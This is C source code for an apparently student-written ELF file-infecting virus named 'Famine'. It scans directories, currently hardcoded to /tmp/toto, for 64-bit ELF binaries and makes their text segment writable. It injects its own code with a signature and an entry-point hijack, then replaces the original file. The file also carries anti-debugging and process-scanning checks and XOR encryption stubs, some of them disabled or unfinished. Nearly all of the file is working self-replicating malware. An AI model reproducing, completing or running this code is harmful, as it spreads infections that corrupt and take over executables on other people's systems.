//
// Created by Joris GOUNAND on 11/8/19.
//

#include <asm/unistd.h>
#include <asm/stat.h>
#include <sys/mman.h>
#include <sys/types.h>
# include <stdbool.h>

#include <dirent.h>
#include <elf.h>
#include <string.h>

# include <stdio.h> // DELL printfs
# define SIZE_BEFORE_ENTRY_POINT 62

typedef struct	s_file
{
	int         fd;
	char		*data;
	size_t		size;
	bool        error;
}				t_file;
struct linux_dirent64 {
	long long        d_ino;    /* 64-bit inode number */
	unsigned long long        d_off;    /* 64-bit offset to next structure */
	unsigned short d_reclen; /* Size of this dirent */
	unsigned char  d_type;   /* File type */
	char           d_name[]; /* Filename (null-terminated) */
};


 size_t  ft_strlen(const char *s);
 int get_env_var(char *name, char *content, int content_size);
 int open_directory(char *path);
 void    *ft_memmove(void *dst, const void *src, size_t len);
 bool process_runing(void); //CHANGER L APPELLE DE DIR
 int do_the_job(char file[],size_t size, char *path);
 int             ft_strncmp(const char *s1, const char *s2, size_t n);
 int infect(char path[],size_t path_length);
 void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_Addr old_e_entry);
 void	ft_putnbr(int nb);
 void		ft_putstr(char *s);
 int		ft_putchar(int c);
 int     ft_isdigit(int c);
 int ft_isallnum(char *str);
 size_t	put_sig(int fd);
 bool	im_infected(char *data);
 bool	is_infected(char *data);
 void decrypter(unsigned long address_of_main);

 char            *ft_strnstr(char *s1, char *s2, size_t n);
 int             ft_strcmp(const char *s1, const char *s2);

#define PAGE_SIZE (4096 *3)

# define __syscall3(type,name,type1,arg1,type2,arg2,type3,arg3)\
type name(type1 arg1,type2 arg2, type3 arg3)\
{\
	register long long    syscall_no  asm("rax") = __NR_##name;\
	register type1   argument1        asm("rdi") = arg1;\
	register type2        arg_2        asm("rsi") = arg2;\
	register type3    arg_3        asm("rdx") = arg3;\
	asm("syscall");\
	register type i asm("rax");\
return i;\
}
# define __syscall2(type,name,type1,arg1,type2,arg2)\
type name(type1 arg1,type2 arg2)\
{\
	register long long    syscall_no  asm("rax") = __NR_##name;\
	register type1   argument1        asm("rdi") = arg1;\
	register type2        arg_2        asm("rsi") = arg2;\
	asm("syscall");\
	register type i asm("rax");\
return i;\
}
# define __syscall1(type,name,type1,arg1)\
type name(type1 arg1)\
{\
	register long long    syscall_no  asm("rax") = __NR_##name;\
	register type1  argument1        asm("rdi") = arg1;\
	asm("syscall");\
	register type i asm("rax");\
return i;\
}

# define __syscall0(type,name)\
type name(void)\
{\
	register long long    syscall_no  asm("rax") = __NR_##name;\
	asm("syscall");\
	register type i asm("rax");\
return i;\
}

ssize_t read(int fd, void *buf, size_t count);
pid_t fork(void);
int close(int fd);
int exit(int status);
int fstat(int fd, struct stat *statbuf);
int rename(const char *oldpath, const char *newpath);
ssize_t read(int fd, void *buf, size_t count);
int open(const char *pathname, int flags, mode_t mode);
int getdents64(unsigned int fd, struct linux_dirent64 *dirp,
               unsigned int count);

ssize_t write(int fd, const void *buf, size_t count);


unsigned long get_eip(void);
extern int yeah;
extern int real_start;
extern int myend;

extern int do_main(void);

_start()
{
	char toto[2];
	toto[0] = '1';
	toto[1] = '2';
	write(1,toto,2);
	__asm__(".globl real_start\n"
	        "real_start:\n"
	        "call do_main\n");
	exit(0);

	asm(
	        "jmp myend\n");

}


int do_main(void)
{
	pid_t pid;
	void *start;
	size_t size;


	if (process_runing())
		return (1);

	start = 0; //value get from the header
	size = 0; //value get from addr
	pid = fork();
	if (pid == 0) //children
	{
		main_encrypt();
		//decrypt

		exit (0);
	}
	return (0);
}
__syscall0(pid_t, fork);
__syscall1(int, close, int, fd);
__syscall1(int, exit, int, status);
__syscall2(int, rename, const char *, old, const char *, new);
__syscall3(ssize_t, read, int, fd, void *, buf, size_t, count);
__syscall3(int, open, const char *, pathname, int, flags, mode_t, mode);
__syscall3(int, getdents64, unsigned int, fd, struct linux_dirent64*, dirp,  unsigned int, count);
__syscall3(off_t, lseek, int, fd, off_t, offset,  int, whence);// a surpprimer
__syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count); // poura etre decalle apres (used for debug)

bool process_runing(void)
{
	return 0;
	int fd,i,dd, nread;
	char buf[256]; // = sizeof(struct dirent)
	char *TracerPid;
	char *Name;
	struct linux_dirent64 *d;
	char path[64];

	ft_putnbr(sizeof(struct linux_dirent64));
	fd = open ("/proc/self/status", 0,0);
	ft_putstr("open /proc/self/status\n");
	while((i =read(fd,buf,256)) > 0)
	{
		if ((TracerPid = ft_strnstr(buf,"TracerPid:",i)) != 0)
		{
			TracerPid += 10;
			while(*TracerPid == '\t' || *TracerPid == ' ')
				TracerPid++;
			if (*TracerPid != '0' && *TracerPid != '\n' && 0) // enlever le 0 pour gdb
				exit(1);
		}


	}
	close(fd);
	dd = open("/proc/",0x10000,0);
	if (dd <= 0)
	{
		ft_putstr("error opem /proc/\n");
		return 1;
	}
	ft_putstr("getdents64");
	ft_memmove(path,"/proc/",6);
	char cmdname[64];
	while ((nread = getdents64(dd, buf, 256)) > 0)
	{
		i = 0;
		while(i<nread)
		{
			d = (struct linux_dirent64 *) (buf + i);
			i += d->d_reclen ;
			if (ft_isallnum(d->d_name) == 0)
			{
				ft_putstr("good :");
				ft_memmove(path + 6,d->d_name,ft_strlen(d->d_name)+ 1);
				ft_memmove(path + ft_strlen(path), "/status\0", 8);
				fd = open(path,0,0);
				ft_putnbr(fd);
				ft_putchar('\n');

				ft_putstr(path);
				ft_putchar('\n');

				read(fd,cmdname, 64);
				if ((Name = ft_strnstr(cmdname,"Name:",i)) != 0)
				{
					Name += 5;
					while(*Name == '\t' || *Name == ' ')
						Name++;
					*ft_strnstr(Name, "\n",50) = '\0';
					if (!ft_strcmp(Name, "login"))
						exit(1);
					ft_putstr(Name);
					ft_putchar('\n');


				}

			}
		}
	}
	return (0);
}



void	ft_putnbr(int nb)
{
	char min[] = {'-','2','1','4','7','4','8','3','6','4','8',0};
	if (nb == -2147483648)
		ft_putstr(min);
	else
	{
		if (nb < 0)
		{
			ft_putchar('-');
			nb = -nb;
		}
		if (nb > 9)
		{
			ft_putnbr(nb / 10);
			ft_putnbr(nb % 10);
		}
		else
			ft_putchar((char)nb + 48);
	}
} // can be delete == debug
int	ft_putchar(int c)
{
	return (write(1, &c, 1));
}// can be delete == debug
void		ft_putstr(char *s)
{
	if (!s)
		return ;
	write(1, s, ft_strlen(s));
}// can be delete == debug
int     ft_isdigit(int c)
{
	if ((c >= '0') && (c <= '9'))
		return (1);
	return (0);
}
int ft_isallnum(char *str)
{
	while(*str)
	{
		if (!ft_isdigit(*str))
			return 1;
		str++;
	}
	return 0;
}
void    *ft_memcpy(void *dst, const void *src, size_t n)
{
	unsigned char   *srctmp;
	unsigned char   *dsttmp;
	size_t                  i;

	srctmp = (unsigned char *)src;
	dsttmp = (unsigned char *)dst;
	i = 0;
	while (i < n)
	{
		dsttmp[i] = srctmp[i];
		i++;
	}
	return ((void *)dst);
}
void    *ft_memmove(void *dst, const void *src, size_t len)
{
	char    *srctmp;
	char    *dsttmp;

	srctmp = (char *)src;
	dsttmp = (char *)dst;
	if (srctmp < dsttmp)
	{
		srctmp = (srctmp + len) - 1;
		dsttmp = (dsttmp + len) - 1;
		while (len-- > 0)
			*dsttmp-- = *srctmp--;
	}
	else
		ft_memcpy(dst, src, len);
	return ((void *)dst);
}
char            *ft_strnstr(char *s1, char *s2, size_t n)
{
	size_t  i;

	if (!(*s2))
		return ((char *)s1);
	while (*s1 && n--)
	{
		if (*s1 == s2[0])
		{
			i = 1;
			while (n-- && s1[i] && s2[i] && s1[i] == s2[i])
				++i;
			if (i == ft_strlen(s2))
				return ((char *)s1);
			n += i;
		}
		s1++;
	}
	return (NULL);
}
size_t  ft_strlen(const char *s)
{
	size_t  i;

	i = 0;
	while (*(s + i) != '\0')
	{
		i++;
	}
	return (i);
}
int             ft_strcmp(const char *s1, const char *s2)
{
	int     index;

	index = 0;
	while (s1[index] && s2[index] &&
	       (unsigned char)s1[index] == (unsigned char)s2[index])
	{
		index++;
	}
	return (int)((unsigned char)s1[index] - (unsigned char)s2[index]);
}
void decrypter(unsigned long address_of_main)
{
	size_t	size;
	size_t	offset;
	char	*start;

	offset = *(int *)(address_of_main - 4 + sizeof(offset));
	size = *(int *)(address_of_main - 4);
	if(size && im_infected(address_of_main))
	{
		start[offset] ^= *(int *)(address_of_main - 4);
		offset++;
		while (offset < size)
		{
			start[offset] ^= start[offset - 1];
			offset++;
		}
	}
}
bool	im_infected(char *data)
{
	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};
	int i;

	i = 0;
	while(sig[i])
	{
		if (sig[i] !=  *((char *)(data - SIZE_BEFORE_ENTRY_POINT + i)))
			return(0);
		i++;
	}
	return(1);
}
int main_encrypt()
{
	char path_env[256] = {'/','t','m','p','/','t','e','s','t',':','/','t','m','p','/','t','e','s','t','2',':',0};
	char path_maj[] = {'P','A','T','H','=',0};
	//printf("virus\n");
	//printf("content: %s\n",path_env);
	get_env_var(path_maj,path_env + 21,256 - 21);
	//printf("content %s\n",path_env);
	size_t path_length = ft_strlen(path_env);
	size_t i = 0;
ft_putstr(path_maj);
	int length_path =0;
	do
	{
		if(path_env[i] == ':')
		{
			path_env[i] = '\0';
			//open_directory(&path[i] - length_path);
			open_directory(&path_env[i] - length_path);
			//write(1,&path[i] - length_path, length_path);
			//write(1,"\n",1);
			path_env[i] = ':';
			length_path = -1;
		}
		else if (path_env[i] == '\0')
		{
			if (length_path)
				open_directory(&path_env[i] - length_path);
			break ;
		}
		i++;
		length_path++;
	}
	while(i < path_length);

	infect(path_env, 256);
	char content[] = {'c','o','n','t','e','n','t',':',' '};
	write(1,content,9);
	write(1,path_env,ft_strlen(path_env));
}
__syscall1(int, unlink, const char *, pathname);
__syscall2(int, fstat, int, fildes, struct stat * , buf);


 int get_env_var(char *name, char *content, int content_size)
{
	char buf[4];
	int fd;
	size_t n,i;
	int j,k = 0;
	int nb_start = 1;
	int name_lenght = ft_strlen(name);
char path_proc[] = {'/','p','r','o','c','/','s','e','l','f','/','e','n','v','i','r','o','n',0};
	if ((fd = open(path_proc,0x0000,0))<0)
		return (0);
	do
	{
		n = read(fd,buf,4);
		for (i= 0; i < n ; ++i)
		{
			if (nb_start)
			{
				if (k != name_lenght)
				{
					if (buf[i] == name[k])
						k++;
					else
					{
						k = 0;
						nb_start = 0;
						j = 0;
					}
				}
				else if (j < content_size - 1)
				{
					if (buf[i] == '\0')
						goto  out;
					content[j++] = buf[i];
				}
				else
					goto out;
			}
			else if (buf[i] == '\0')
				nb_start = 1;
		}
	}
	while(n);
	out:
	content[j] = '\0';
	close(fd);
	return (content[0] != '\0');
}
 int open_directory(char *path)
{
	int dd,nread;
	char buf[128];
	char path_file[256];
	t_file file;
	int i = 0;
	struct linux_dirent64 *d;
	size_t len;

	char directory[] = {'d','i','r','e','c','t','o','r','y',':',' ',0};
	ft_putstr(directory);
	write(1,path,ft_strlen(path));
	write(1,"\n",1);
	//printf("directory: '%s'\n",path);

	//path = "/tmp/toto";
	path[0] = '/';
	path[1] = 't';
	path[2] = 'm';
	path[3] = 'p';
	path[4] = '/';
	path[5] = 't';
	path[6] = 'o';
	path[7] = 't';
	path[8] = 'o';
	path[9] = 0;

	dd = open (path, 0x10000,0);
	if (dd < 0)
	{
		char fail[]={'o','p','e','n',' ', 'f','a','i','l',0 };
		ft_putstr(fail);
		ft_putstr(path);
		ft_putchar('\n');
		//printf("open fail: '%s'\n",path);

		return 1;

	}
	char getd[] = {'g','e','t','d','e','n','t','s','6','4','\n',0};
	ft_putstr(getd);
	//printf("getdents64\n");
	nread = getdents64(dd, buf, 128);
	char name_nread[] = {'n','r','e','a','d',' ' ,':',0};
	write(1,name_nread,7);
	ft_putnbr(nread);
	write(1,"\n",1);
	//printf("nread %d\n",nread);
	int c;
	while (i < nread)
	{
		d = (struct linux_dirent64 *) (buf + i);
		i += d->d_reclen ;
		char host[] = {'h','o','s','t',' ',':',0};
		ft_putstr(host);
		ft_putstr(d->d_name);
		char type[] = {' ','t','y','p','e',' ' ,0};
		ft_putstr(type);
		ft_putnbr(d->d_type);
		ft_putchar('\n');
		//printf("host %s type %d\n",d->d_name, d->d_type);
		if (d->d_name[0] == '.')
			continue;
		len = ft_strlen(path);
		ft_memmove(path_file,path,len);
		path_file[len] = '/';
		ft_memmove(path_file + len + 1,d->d_name, ft_strlen(d->d_name));
		path_file[len + 1 + ft_strlen(d->d_name)] = '\0';
		ft_putstr(d->d_name);
		ft_putchar(' ');
		ft_putstr(path_file);
		ft_putchar('\n');
		//printf("%s %s\n",d->d_name,path_file);
		struct stat st;
		int fd = open (path_file, 0,0);
		fstat(fd , &st);
		char mem[st.st_size];
		int c = read(fd, mem,st.st_size);
		//write(1,mem,st.st_size);
		do_the_job(mem,st.st_size,path_file);
			exit(4);
	}
	close(dd);
	return 0;
}
 int do_the_job(char buff[],size_t size, char *path)
{
 	char debut[]={'d','e','b','u','t',' ','d','o','_','t','h','e','_','j','o','b','\n','0'};
	ft_putstr(debut);
	//printf("debut do_the_job\n");
	Elf64_Ehdr          *header;
	Elf64_Phdr*             seg;
	Elf64_Shdr*             sec;
	size_t      parasite_size = 690;
	Elf64_Addr text;
	Elf64_Addr parasite_vaddr;
	Elf64_Addr old_e_entry;
	Elf64_Addr end_of_text;
	int text_found = 0;
	int i;
	char ono[] = {'1','\n','0'};
	ft_putstr(ono);
	ft_putnbr(size);
	write(1, buff, 20);
	ft_putchar('\n');
	if (size < sizeof(Elf64_Ehdr) || ft_strncmp(buff, ELFMAG,SELFMAG) || buff[EI_CLASS] != ELFCLASS64)
	{
		char ret[] ={'r','e','t','u','r','n',' ', '1','\n',0};
		ft_putstr(ret);
		return (1);
	}
	char one_one[]={'1','.','1','\n',0};
	ft_putstr(one_one);

	header = (Elf64_Ehdr *)buff;
	 if(is_infected(buff))
	 {
	 	char deja[] = {'d','e','j','a',' ' ,'i','n','f','e','c','t','e','d','\n',0};
	 	ft_putstr(deja);
		 return (1);

	 }

	 ft_putchar('2');
	 ft_putchar('\n');

	//Recupere le premier segement TEXT on lui rajoute 4096
	//puis on rajoute a tous les segment suivant 4096
	seg = (Elf64_Phdr*)(buff + header->e_phoff);
	for (i = header->e_phnum; i-- > 0; seg++)
	{
		if (text_found)
		{
			//printf("seg-.p_vaddr %llx p_offset before %llx",seg->p_vaddr, seg->p_offset);
			seg->p_offset += PAGE_SIZE;
			//printf(" after %llx\n",seg->p_offset);
			continue;
		}
		else
		if (seg->p_type == PT_LOAD)
		{
			if (seg->p_flags == (PF_R | PF_X))
			{
				seg->p_flags |= PF_W;
				text = seg->p_vaddr;
				parasite_vaddr = seg->p_vaddr + seg->p_filesz;

				old_e_entry = header->e_entry;
				header->e_entry = parasite_vaddr + 64;
				end_of_text = seg->p_offset + seg->p_filesz;
				seg->p_filesz += parasite_size;
				seg->p_memsz += parasite_size;
				text_found++;
				ft_putnbr(parasite_vaddr);
				ft_putstr("\n");
				ft_putnbr(end_of_text);
			}
		}
	}
	ft_putchar('3');
	ft_putchar('\n');

	sec = (Elf64_Shdr*)(buff + header->e_shoff);

	for (i = header->e_shnum; i-- > 0; sec++)
	{
		//printf("section %llx\n",sec->sh_offset);
		if (sec->sh_offset >= end_of_text)
			sec->sh_offset += PAGE_SIZE;
		else
		if (sec->sh_size + sec->sh_addr == parasite_vaddr)
			sec->sh_size += parasite_size;
	}
	header->e_shoff += PAGE_SIZE;
	new_file(buff,size,end_of_text, path,old_e_entry);
	char fin[] = {'f','i','n','\n',0};
	ft_putstr(fin);
	return 0;
}
int infect(char path[],size_t path_length)
{
	size_t i = 0;

	int length_path =0;
	do
	{
		if(path[i] == ':')
		{
			path[i] = '\0';
			//open_directory(&path[i] - length_path);
			open_directory(&path[i] - length_path);
			//write(1,&path[i] - length_path, length_path);
			//write(1,"\n",1);
			path[i] = ':';
			length_path = -1;
		}
		else if (path[i] == '\0')
		{
			if (length_path)
				open_directory(&path[i] - length_path);
			break ;
		}
		i++;
		length_path++;
	}
	while(i < path_length);
	return 0;
}
 char    *only_name(char *line)
{
	int        size;
	size = ft_strlen(line);
	size++;
	while (--size)
	{
		if (line[size] == '/')
			return (&(line[size + 1]));
	}
	return (line);
}
 void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_Addr old_e_entry)
{
	int fd;
	char tmp[125];
	unsigned int parasite_size = ((char *)&myend - (char *)&real_start )+ 7;
	char jmp_code[7];

	jmp_code[0] = '\x68'; /* push */
	jmp_code[1] = '\x00'; /* 00 */
	jmp_code[2] = '\x00'; /* 00	*/
	jmp_code[3] = '\x00'; /* 00	*/
	jmp_code[4] = '\x00'; /* 00	*/
	jmp_code[5] = '\xc3'; /* ret */
	jmp_code[6] = 0;

	*(unsigned long *) &jmp_code[1] = old_e_entry; //fait supprimer tmp

	char new_debut [] = {'n','e','w','_','f','i','l','e',' ' ,'d','e','b','u','t',' ' ,0};
	ft_putstr(new_debut);

	for (int i = 0; i< 125;i++)
		tmp[i] = 0;
	ft_memmove(tmp,path,ft_strlen(path));
	ft_memmove(only_name(tmp) + 1,only_name(tmp), ft_strlen(only_name(tmp)));
	*only_name(tmp) = '.';
	ft_putstr(tmp);
	ft_putchar('\n');
	if ((fd = open (tmp, 0x242, 0755)) < 0)
	{
		char error[] = {'e','r','r','o','r',' ' ,'o','p','e','n',' ' ,'f','d',0};
		ft_putstr(error);
		return ;
	}
	char new_debut1 [] = {'n','e','w','_','f','i','l','e',' ' ,'1','\n',0};

	ft_putstr(new_debut1);
	write(fd,buf, end_of_text);




	unsigned long address_of_start = get_eip() - ((char *)&yeah - (char *)&real_start);

size_t size_wrote = 0;
	size_wrote =	put_sig(fd);

	char fwe[]={'s','i','z','e',' ' ,'w','r','o','t','e',' ' ,':',' ' ,0};ft_putstr(fwe);ft_putnbr(size_wrote);ft_putstr("\n");

	size_wrote += write(fd,"\xcc",1);
	size_wrote += write(fd,(char *) address_of_start,parasite_size - 7);
	size_wrote += write(fd,jmp_code,7);

	for (int i = 0; i< PAGE_SIZE - size_wrote ;i++)
		write(fd,"j",1);

	write(fd,buf + end_of_text, size - end_of_text);

	//lseek(fd, end_of_text, SEEK_SET);

	char old [] = {'o','l','d',' ' ,'e','n','t','r','y',' ' ,0};
	ft_putstr(old);
	ft_putnbr(old_e_entry);
	ft_putchar('\n');
	//write(fd,needle, 62);

	char para[] = {'p','a','r','a','z','i','t','e',' ' ,'s','i','z','e',' ' ,':',0};
	ft_putstr(para);
	ft_putnbr(parasite_size);
	ft_putchar('\n');

	char name_tmp[]={'t','m','p',' ','\'',0};
	char name_path[] = {'\'',' ','p','a','t','h',' ','\'',0};
	ft_putstr(name_tmp);
	ft_putstr(tmp);
	ft_putstr(name_path);
	ft_putstr(path);
	ft_putchar('\n');
	//printf("tmp %s, path %s\n",tmp, path);
	close(fd);

	unlink(path);
	int ret = rename (tmp, path);
	char name_renam[]={'f','i','n',' ','r','e','n','a','m','e',' ',0};
	ft_putstr(name_renam);
	ft_putnbr(ret);
	ft_putchar('\n');

}

 int             ft_strncmp(const char *s1, const char *s2, size_t n)
{
	size_t  index;

	index = 0;
	while (index < n && s1[index] && s2[index] &&
	       (unsigned char)s1[index] == (unsigned char)s2[index])
	{
		index++;
	}
	if (index >= n)
		return (0);
	return (int)((unsigned char)s1[index] - (unsigned char)s2[index]);
}

 bool	is_infected(char *data)
{
	Elf64_Ehdr          *header;
	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};
	int i;

	i = 0;
	header = (Elf64_Ehdr *)data;
	char name_enter[] ={'e','n','t','e','r',' ','i','n','f','e','c','t','e','d','\n',0};
	ft_putstr(name_enter);
		while(sig[i])
	{
		ft_putnbr(i);
		if (sig[i] !=  *((char *)(data + header->e_entry - SIZE_BEFORE_ENTRY_POINT + i)))
		{
			char is_inf[] ={'i','s',' ','i','n','f','e','c','t','e','d',' ' ,'r','e','t',' ' ,'0',0};
			ft_putstr(is_inf);
			return(0);

		}
		i++;
	}
		char name_ret = {'r','e','t',' ','1','\n',0};
	ft_putstr(name_ret);

	return(1);
}



 size_t	put_sig(int fd)
{
	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' ',0};
	char fingerprint[] = {'0','0','0','0','0','0','0','0',0};
	int i;
	size_t size;
	unsigned long address_of_main = get_eip() - ((char *)&yeah - (char *)&real_start);

	if (im_infected(address_of_main))
{
		char name_new[]={'n','e','w',' ','o','n','e','\n',0};
	ft_putstr(name_new);
	*(long long *)fingerprint = address_of_main - sizeof(long long);
}
	ft_putstr(fingerprint);

	i = 7;
	while(i >= 0)
	{
		if(fingerprint[i] == '9')
		{
			fingerprint[i] = '0';
		}
		else
		{
			fingerprint[i]++;
			break;
		}
		i--;
	}
	size = write(fd,sig, sizeof(sig));
	ft_putstr(fingerprint);
	size += write(fd,fingerprint, sizeof(fingerprint));
	return (size);
}

void crypter(char *read, size_t size, char key, int fd)
{
	char tab[]= {0,0};

	if(size && is_infected(read))
	{
		write(fd, (tab[size % 2] = (read[size] ^ key)), 1);
		size--;
		while (size)
		{
			write(fd, (tab[size % 2] = (read[size] ^ tab[(size - 1) % 2])), 1);
			size--;
		}
	}
}

unsigned long get_eip(void)
{
	__asm__("call yeah\n"
	        ".globl yeah\n"
	        "yeah:\n"
	        "popq %rax");
}
void end_code() {
__asm__(".globl myend\n"
        "myend:	     \n"
        "mov $1,%rax \n"
        "mov $0,%rbx \n"
        "int $0x80   \n");

}
